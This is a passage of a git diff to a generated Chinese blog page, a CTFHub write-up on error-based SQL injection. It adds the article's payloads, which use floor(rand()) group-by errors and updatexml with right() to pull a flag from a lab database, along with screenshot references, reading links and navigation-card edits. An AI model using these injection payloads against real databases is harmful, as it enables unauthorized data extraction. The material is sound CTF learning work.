class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),<span class="number">0x3a</span>,(<span class="keyword">select</span> concat(flag) <span class="keyword">from</span> sqli.flag limit <span class="number">0</span>,<span class="number">1</span>)) x <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> x</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/bamboo/AppData/Roaming/Typora/typora-user-images/image-20211113154030031.png" alt="image-20211113154030031"></p>
+<p><img src="C:/Users/bamboo/AppData/Roaming/Typora/typora-user-images/image-20211113154057261.png" alt="image-20211113154057261"></p>
+<h4 id="长度问题"><a href="#长度问题" class="headerlink" title="长度问题"></a>长度问题</h4><p>MID函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> mid(column_name,<span class="keyword">start</span>[,length]) <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure>
+
+<p>right函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>, <span class="keyword">right</span>((<span class="keyword">select</span>(group_concat(flag)) <span class="keyword">from</span> sqli.flag) ,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:/Users/bamboo/AppData/Roaming/Typora/typora-user-images/image-20211113153448415.png" alt="image-20211113153448415"></p>
+<p><img src="C:/Users/bamboo/AppData/Roaming/Typora/typora-user-images/image-20211113154220087.png" alt="image-20211113154220087"></p>
+<p>参考资料：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/tempulcc/article/details/108977877">(19条消息) Ctfhub之SQL注入|SQL报错注入及原理详解_tempulcc的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m_de_g/article/details/119151644">(20条消息) CTFHUB-SQL注入_m_de_g的博客-CSDN博客</a>【SQL注入讲解】</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Auuuuuuuu/article/details/91415165">(20条消息) MySQL报错注入函数汇总_Au-CSDN博客_mysql报错注入函数</a>【基本函数的一个说明可以参考】</p>
 
                 
             </div>
@@ -539,7 +616,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/11/11/CtfHub-git%E6%B3%84%E9%9C%B2/">http://example.com/2021/11/11/CtfHub-git%E6%B3%84%E9%9C%B2/</a>
+                    <a href="http://example.com/2021/11/12/b1112/">http://example.com/2021/11/12/b1112/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -746,9 +823,48 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/11/12/b1112/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="CTFHub-报错注入">
+                        
+                        <span class="card-title">CTFHub-报错注入</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-12
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            小竹
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2021/11/12/1111/">
                     <div class="card-image">
@@ -766,45 +882,8 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-12
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            小竹
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/11/10/hello-world/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-10
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-12
                             </span>
                         <span class="publish-author">
                             
